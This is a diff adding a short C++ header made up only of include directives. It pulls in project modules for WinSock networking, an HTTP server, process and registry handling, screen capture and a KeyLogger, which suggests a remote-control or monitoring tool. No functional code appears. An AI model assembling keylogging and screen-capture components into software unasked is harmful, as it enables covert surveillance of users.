@@ -1,0 +1,15 @@
+#pragma once
+#include "DittoNetworksLib/WinSock.hpp"
+#include "DittoNetworksLib/HttpServer.hpp"
+#include "Process.hpp"
+#include "WindowsException.hpp"
+#include "Logger.hpp"
+#include "SystemUtils.hpp"
+#include "KeyLogger.hpp"
+#include "BatteryUtils.hpp"
+#include "SystemInfo.hpp"
+#include "Screen.hpp"
+#include "RegistryKey.hpp"
+#include <exception>
+#include <iostream>
+#include <chrono>
